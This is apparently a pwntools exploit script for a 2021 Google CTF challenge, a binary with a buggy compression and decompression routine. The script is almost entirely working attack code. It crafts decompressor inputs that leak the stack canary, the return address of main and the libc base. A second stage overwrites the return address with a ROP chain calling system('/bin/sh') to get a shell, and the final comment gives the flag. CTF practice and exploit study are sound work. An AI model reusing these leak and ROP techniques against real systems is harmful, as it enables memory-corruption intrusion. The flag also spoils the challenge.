#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('compress_patched')

host = args.HOST or 'compression.2021.ctfcompetition.com'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


from string import hexdigits

def compress_test(s):
    io = process(exe.path)
    io.recvuntil(b'What')
    io.sendline(b'1')
    io.recvuntil(b'Send me the hex')
    io.sendline(s)
    io.recvuntil(b'bytes compress to')
    io.recvline()
    compressed = io.recvline().strip()
    print(f'{compressed} for {s}')
    io.kill()
    io.close()
    
def decompress_test(s):
    io = process(exe.path)
    io.recvuntil(b'What')
    io.sendline(b'2')
    io.recvuntil(b'Send me the hex')
    io.sendline(s)
    io.recvuntil(b'decompresses to')
    io.recvline()
    decompressed = io.recvline().strip()
    print(f'{decompressed} for {s}')
    io.kill()
    io.close()
    
def compress(s):
    global io
    io.recvuntil(b'What')
    io.sendline(b'1')
    io.recvuntil(b'Send me the hex')
    io.sendline(s)
    io.recvuntil(b'bytes compress to')
    io.recvline()
    compressed = io.recvline().strip()
    print(f'{compressed} for {s}')

def decompress(s):
    global io
    io.recvuntil(b'What')
    io.sendline(b'2')
    io.recvuntil(b'Send me the hex')
    io.sendline(s)
    io.recvuntil(b'decompresses to:\n')
    # decompressed = io.recvline().strip()
    # print(f'{decompressed} for {s}')
    

'''
command: ff <pattern length>  <how many bytes to repeat it>

adding writes i think
'''

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def make_length(n):
    i = 0
    out = 0
    
    while n != 0:
        out |= (n & 0x7f) << (8*i)
        n >>= 7
        if n != 0:
            out |= 0x80 << (8*i)
        
        i += 1
        
    return out.to_bytes(10, 'little').rstrip(b'\x00').hex().encode()

gdbscript = '''
tbreak main
# see canary value
# pie b *0x11ef
# rdx is outit
# pie b *0x1990
# main ret addr
pie b *0x1357
continue
'''.format(**locals())

class DecompressXploiter():
    def __init__(self):
        self.__magic = b'54494e59'
        self.__payload = b''
        self.numbytes = 0
        self.__end = b'ff0000'
        
    def leak(self, offset):
        if offset > 0:
            patternlen = make_length(2**64-offset+self.numbytes)
        else:
            patternlen = make_length(abs(offset)+self.numbytes)
        leaklen = make_length(8)

        self.numbytes += 8
        self.__payload += b'ff' + patternlen + leaklen
        
    def pad(self, num):
        self.__payload += b'aa'*num
        self.numbytes += num

    def add(self, b):
        self.__payload += b
        self.numbytes += len(b)
        
    def chain(self):
        return self.__magic + self.__payload + self.__end
    
    def cycle(self, begin, numb):
        patternlen = make_length(self.numbytes - begin)
        towrite = make_length(numb)
        self.__payload += b'ff' + patternlen + towrite
        self.numbytes += numb
        
    def len(self):
        return self.numbytes

# THIS LEAKS MAIN'S RET ADDRESS
# 0b3
# start main is fc0
# libc6_2.31-0ubuntu9.1_amd64
# libc6_2.31-0ubuntu9.2_amd64
# libc6_2.31-0ubuntu9_amd64
# mainret_leak = b'54494e59ff' + make_length(2**64 - 4104 - 0x30) + make_length(8) + b'ff0000'

# # THIS LEAKS CANARY
# canary_leak = b'54494e59ff' + make_length(2**64 - 4104) + make_length(8) + b'ff0000'

# # THIS LEAKS main+738
# main_leak = b'54494e59ff' + make_length(0x2318) + make_length(8) + b'ff0000'

# # THIS LEAKS MAIN'S RETADDR, main+738, CANARY, IN THAT ORDER
# uberleak = b'54494e59ff' + make_length(2**64 - 4104 - 0x30) + make_length(8) + b'ff' + make_length(0x2318+8) + make_length(8) + b'ff' + make_length(2**64 - 4104+16) + make_length(8) + b'ff0000'

# # WE ADD A 0b3 TO THE UBERLEAK AND ALSO WRITE THIS SHIT A LOT OF TIMES
# npad = 6
# npad2 = 8*4
# firststage = b'54494e59' + b'aa'*npad + b'ff' + make_length(2**64 - 4104 - 0x30 + npad) + make_length(8) + b'aa'*npad2 + b'ff' + make_length(2**64 - 4104+8 + npad) + make_length(8) + b'ff' + make_length(0x2318+16 + npad) + make_length(8) + b'b300' + b'ff' + make_length(26+npad2) + make_length(0x1038 - (26+npad+npad2) + 8 + 2 - 15) + b'ff0000'

# 00257bc2f6357f0000008d75aa5eae

# THIS LEAKS THE CANARY AFTER 8 A'S AND WRITES IT LOTS OF TIMES
# THERE IS NO DESTINATION OVERFLOW ERROR WHEN USING THE 'SPECIAL COMMAND'
# canary_leak = b'54494e59aaaaaaaaaaaaaaaaff' + make_length(2**64 - 4103 + 7) + make_length(8) + b'ff' + make_length(8) + make_length(5000) + b'ff0000'

# decompress_test(canary_leak)
# decompress_test(mainret_leak)

def reversed_hex(h):
    c = list(chunks(h, 2))
    rev_c = list(reversed(c))
    return int(b''.join(rev_c), 16)

io = start(env={'LD_PRELOAD':'./libc.so.6'})
libc = ELF('./libc.so.6')

# offsets relative to output buffers in main
mainret_offset = 0x1038
start_offset = 0x1070
canary_offset = 0x1008

# STAGE 1: OBTAINING LEAKS AND CALLING MAIN AGAIN
beginpad = 8*2 # alignment for canary to end up on right place
middlepad = 0x20
stage1 = DecompressXploiter()
stage1.pad(beginpad)
stage1.leak(canary_offset) # has to end on canary
stage1.pad(middlepad) # between canary and ret addr: 5 words
stage1.leak(mainret_offset)
stage1.leak(start_offset) # has to end on ret addr
stage1.cycle(beginpad, 0x1040 - stage1.len()*2 + beginpad*2 + 8*5)

decompress(stage1.chain())
io.recvn(beginpad*2)
canary = reversed_hex(io.recvn(16))
io.recvn(middlepad*2)
mainret = reversed_hex(io.recvn(16))
start = reversed_hex(io.recvn(16))
libc.address = mainret - 243 - libc.sym.__libc_start_main

log.info(f'Canary: {hex(canary)}')
log.info(f'Main Return: {hex(mainret)}')
log.info(f'Start: {hex(start)}')
log.info(f'Libc: {hex(libc.address)}')

# STAGE 2: SYSTEM BINSH ROP
rop = ROP(libc)
rop.call(rop.ret)
rop.call('system', [next(libc.search(b'/bin/sh'))])

beginpad = 8*3
middlepad = 8*5
stage2 = DecompressXploiter()
stage2.pad(beginpad)
stage2.add(p64(canary).hex().encode())
stage2.pad(middlepad)
stage2.add(rop.chain().hex().encode())
stage2.cycle(beginpad, 0x1100)
decompress(stage2.chain())

io.recvline()
io.interactive() # CTF{lz77_0r1ent3d_pr0gr4mming}